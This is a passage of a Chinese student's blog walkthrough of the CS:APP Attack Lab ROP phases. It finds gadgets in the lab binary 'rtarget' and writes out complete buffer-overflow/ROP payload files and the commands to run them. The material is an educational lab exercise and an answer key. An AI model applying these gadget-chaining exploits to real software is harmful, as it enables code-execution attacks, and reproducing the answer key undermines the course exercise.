<p>有意识的搜索%rdi这个寄存器相关的机器指令<code>48 89 c7</code>,搜索和%rax有关的<code>58</code>,便注意到这两个函数,<addval_273>和<addval_219>,在rtarget的反汇编中把他找出来(这样能找到地址)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq   </span><br></pre></td></tr></table></figure>

<p>当273&gt;函数从0x004019a2开始时,会执行<code>mov %rax,%rdi</code>,<code>ret</code></p>
<p>当219&gt;函数从0x004019ab开始时,会执行<code>pop %rax</code>,<code>ret</code>.</p>
<p>这样我们不就可以组合出我们的代码了吗,通过一个一个ret来吧不同的gadget连接在一起</p>
<p>答案框架如下,</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">---栈底---</span><br><span class="line">0x4017ec    &lt;---touch2地址</span><br><span class="line">0x4019a2    &lt;--gadget2</span><br><span class="line">cookie            #0x59b997fa   &lt;----%rsp</span><br><span class="line"> 0x4019ab     &lt;---gadget1</span><br><span class="line">---栈顶---</span><br></pre></td></tr></table></figure>

<p>编写答案 sol4.txt(注意小端法)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">ab 19 40 00 00 00 00 00</span><br><span class="line">fa 97 b9 59 00 00 00 00</span><br><span class="line">a2 19 40 00  00 00 00 00</span><br><span class="line">ec 17 40 00 00 00 00 00</span><br></pre></td></tr></table></figure>

<p>输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt;sol4.txt &gt;sol4r.txt &amp;&amp; ./rtarget -q -i sol4r.txt</span><br></pre></td></tr></table></figure>

<p>注意是要运行rtarget!!!,不要搞错了兄弟们!!!</p>
<p>若出现以下界面则为成功通关</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220002.png" alt="image-20240302021056405"></p>
<h2 id="Phase-5"><a href="#Phase-5" class="headerlink" title="Phase_5"></a>Phase_5</h2><blockquote>
<p>坚持就是胜利!</p>
</blockquote>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127944.png" alt="image-20240229212126798"></p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402292127952.png" alt="image-20240229212144522"></p>
<img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220043.png" alt="image-20240301232923919" style="zoom:200%;" />

<p>我们要通过ROP实现touch3的功能,touch3在phase_3的实现如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push $0x004018fa</span><br><span class="line">lea 0x8(%rsp),%rdi</span><br><span class="line">retq</span><br></pre></td></tr></table></figure>

<p>操作顺序如下:</p>
<ul>
<li>把touch3的地址压入栈中</li>
<li>把cookie的字符串指针地址存入到%rdi寄存器中</li>
</ul>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">35 39 62 39 39 37 66 61 00 # 00 是字符串末尾结束的\0</span><br></pre></td></tr></table></figure>

<p>地址怎么找?</p>
<p>这是要重点解决的问题.因为开启了栈的随机化,无法定位字符串精确位置但我们可以通过栈顶的地址+相对地址得到字符串的地址</p>
<p>如何把准确的地址传送到%rdi寄存器中呢?当然是提前计算好偏移量,然后用一个寄存器承载这个偏移量,再一点一点的把他搬运到%rdi当中啦</p>
<p>下面是寻找一条完整的通路的全过程(已经将函数从farm中的形式换为了rtarget中的形式,使得地址一目了然),在这里面”—&gt;”表示我倒序寻找通路时思维的前进试探,慢慢打通每一个节点,是寄存器转移顺序的反向,箭头后面表示的是Gadget的起始地址.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">0000000000401a03 &lt;addval_190&gt;:</span><br><span class="line">  401a03:	8d 87 41 48 89 e0    	lea    -0x1f76b7bf(%rdi),%eax</span><br><span class="line">  401a09:	c3                   	retq  </span><br><span class="line">  ----- %rsp--&gt;%rax----0x401a06------------</span><br><span class="line"></span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">  ----%rax--&gt;%rdi----0x4019a2--------</span><br><span class="line">  这样子就把%rsp的地址丢到%rdi当中了</span><br><span class="line">  执行完getbuf时%rsp= 0x5561dca8</span><br><span class="line">  字符串应该是存在栈顶+相对位置</span><br><span class="line"></span><br><span class="line">00000000004019d6 &lt;add_xy&gt;:</span><br><span class="line">  4019d6:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  4019da:	c3                   	retq  </span><br><span class="line">----这个lea能把%rsi作为偏移量,计算好后再返回到%rdi中就好了---0x4019d6</span><br><span class="line"></span><br><span class="line">所以我们就要想办法往%rsi中丢值,因为找不到pop %rsi的片段,只能从其他地方入手</span><br><span class="line"></span><br><span class="line">0000000000401a11 &lt;addval_436&gt;:</span><br><span class="line">  401a11:	8d 87 89 ce 90 90    	lea    -0x6f6f3177(%rdi),%eax</span><br><span class="line">  401a17:	c3                   	retq   </span><br><span class="line">  </span><br><span class="line">  ---%ecx---&gt;%esi----0x401a13</span><br><span class="line"> -----</span><br><span class="line">  想试验下78 和c9会不会影响执行程序,不会影响,照样能运行</span><br><span class="line">00000000004019e8 &lt;addval_113&gt;:</span><br><span class="line">  4019e8:	8d 87 89 ce 78 c9    	lea    -0x36873177(%rdi),%eax</span><br><span class="line">  4019ee:	c3                   	retq </span><br><span class="line">-----0x4019ea------</span><br><span class="line"></span><br><span class="line">一步步往前找,每找到一个就看一下能不能通过pop得到该值</span><br><span class="line"></span><br><span class="line">0000000000401a68 &lt;getval_311&gt;:</span><br><span class="line">  401a68:	b8 89 d1 08 db       	mov    $0xdb08d189,%eax</span><br><span class="line">  401a6d:	c3                   	retq   </span><br><span class="line"></span><br><span class="line">---%edx---&gt;%ecx---0x401a69----</span><br><span class="line"></span><br><span class="line">00000000004019db &lt;getval_481&gt;:</span><br><span class="line">  4019db:	b8 5c 89 c2 90       	mov    $0x90c2895c,%eax</span><br><span class="line">  4019e0:	c3                   	retq  </span><br><span class="line"></span><br><span class="line">  ---%edx---&gt;%eax---0x4019dd---</span><br><span class="line">  </span><br><span class="line">00000000004019ca &lt;getval_280&gt;:</span><br><span class="line">  4019ca:	b8 29 58 90 c3       	mov    $0xc3905829,%eax</span><br><span class="line">  4019cf:	c3                   	retq  </span><br><span class="line">  ----pop %rax---0x4019cc----</span><br><span class="line">  </span><br><span class="line">找到了一条通路,所以我们就可以通过pop %rax的值来吧那个偏移量送到%rsi中,最后再把%rdi给更新了</span><br><span class="line">就能够定位字符串的位置了</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>接下来我们找到每个gadget的location,记得加上一点偏移量来定位到对应的Gadgets开头,然后我们就可以编写答案框架了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">----栈顶----</span><br><span class="line">buf缓冲区,要填0x28个字符</span><br><span class="line">movq %rsp--&gt;%rax            &lt;----gadget1    0x401a06   &lt;----%rsp</span><br><span class="line">movq %rax---&gt;%rdi           &lt;----gadget2    0x4019a2</span><br><span class="line">pop %rax		           &lt;----gadget3     0x4019cc</span><br><span class="line">相对偏移量  0x48</span><br><span class="line">movl %eax---&gt;%edx          &lt;---gadget4      0x4019dd</span><br><span class="line">movl %edx---&gt;%ecx          &lt;---gadget5      0x401a69</span><br><span class="line">movl %ecx----&gt;%esi	      &lt;---gadget6	0x401a13</span><br><span class="line">lea (%rdi,%rsi,1),%rax	     &lt;---gadget7      0x4019d6</span><br><span class="line">movl %rax---&gt;%rdi            &lt;----gadget8      0x4019a2</span><br><span class="line">$touch3                                &lt;---gadget9        0x004018fa</span><br><span class="line">cookie 			             &lt;---gadget10       35 39 62 39 39 37 66 61</span><br><span class="line">---栈底---</span><br></pre></td></tr></table></figure>



<p>编写sol5.txt文档</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">06 1a 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">cc 19 40 00 00 00 00 00</span><br><span class="line">48 00 00 00 00 00 00 00</span><br><span class="line">dd 19 40 00 00 00 00 00</span><br><span class="line">69 1a 40 00 00 00 00 00</span><br><span class="line">13 1a 40 00 00 00 00 00</span><br><span class="line">d6 19 40 00 00 00 00 00</span><br><span class="line">a2 19 40 00 00 00 00 00</span><br><span class="line">fa 18 40  00 00 00 00 00</span><br><span class="line">35 39 62 39 39 37 66 61</span><br></pre></td></tr></table></figure>

<p>输入命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./hex2raw &lt;sol5.txt &gt;sol5r.txt &amp;&amp; ./rtarget -q -i sol5r.txt</span><br></pre></td></tr></table></figure>



<p>提交一手,完美通关!!!</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220099.png" alt="image-20240302010809099"></p>
<p>至此,圆满完成通关!</p>
<h1 id="小记"><a href="#小记" class="headerlink" title="小记"></a>小记</h1><p>这篇详解是我在第一次做时边做边写的,做完phase_5后又兴致大发开始梳理编写,现在是3月2日的凌晨2:16分,大脑又困又转动.</p>
<p>实话实说,做这个真的很有意思,虽然我看了不少人的答案,毕竟一开始真的不能理解,不过现在大都理解了,这是一共的文件数量,做完整个lab.</p>
<p><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202403020220164.png" alt="image-20240302021849311"></p>
<p>希望下一次能够独立做出lab!这才是更大的进步!</p>
<blockquote>
<p>Good Luck:生命不止,奋斗不息</p>
</blockquote>

    </div>

    
    
    

      <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag"># 学习笔记</a>
              <a href="/tags/csapp/" rel="tag"># csapp</a>
          </div>

        


        
    <div class="post-nav">
      <div class="post-nav-item">
    <a href="/VOA/VOA_2/2024/02/27/" rel="prev" title="Quasar">
      <i class="fa fa-chevron-left"></i> Quasar
    </a></div>
      <div class="post-nav-item">
    <a href="/CSAPP/lab0/2024/02/27/" rel="next" title="CSAPP自学指北">
      CSAPP自学指北 <i class="fa fa-chevron-right"></i>
    </a></div>
    </div>
      </footer>
    
  </article>
  
  
  



          </div>
          
    <div class="comments" id="valine-comments"></div>

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Part-I-CI"><span class="nav-number">1.</span> <span class="nav-text">Part I CI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E8%A7%88"><span class="nav-number">1.1.</span> <span class="nav-text">总览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-1"><span class="nav-number">1.2.</span> <span class="nav-text">Phase_1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-2"><span class="nav-number">1.3.</span> <span class="nav-text">Phase_2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-3"><span class="nav-number">1.4.</span> <span class="nav-text">Phase_3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Part-II-ROP"><span class="nav-number">2.</span> <span class="nav-text">Part II: ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%80%BB%E8%A7%88-1"><span class="nav-number">2.1.</span> <span class="nav-text">总览</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-4"><span class="nav-number">2.2.</span> <span class="nav-text">Phase_4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Phase-5"><span class="nav-number">2.3.</span> <span class="nav-text">Phase_5</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B0%8F%E8%AE%B0"><span class="nav-number">3.</span> <span class="nav-text">小记</span></a></li></ol></div>
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="zhz_vite"
      src="/images/avatar.jpg">
  <p class="site-author-name" itemprop="name">zhz_vite</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">41</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
        <span class="site-state-item-count">10</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
        <span class="site-state-item-count">21</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/zhzvite" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;zhzvite" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:2811215248@qq.com" title="E-Mail → mailto:2811215248@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2024</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">zhz_vite</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="站点总字数">416k</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="站点阅读时长">12:36</span>
</div>
<!-- 网站运行时间的设置 -->
<span id="timeDate">载入天数...</span>
<span id="times">载入时分秒...</span>
<script>
    var now = new Date();
    function createtime() {
        var grt= new Date("01/01/2024 00:00:00"); //此处修改你的建站时间或者网站上线时间
        now.setTime(now.getTime()+250);
        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
        document.getElementById("timeDate").innerHTML = "本站已半死不活地运行 "+dnum+" 天 ";
        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒.";
    }
setInterval("createtime()",250);
</script>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/muse.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : false,
      notify     : false,
      appId      : 'FjQmI706XTGQP3WHoYu51jaj-gzGzoHsz',
      appKey     : '7f8iu1agX4mrT7NPuBgu9HVw',
      placeholder: "随便说点吧哥们",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : '' || 'zh-cn',
      path       : location.pathname,
      recordIP   : true,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
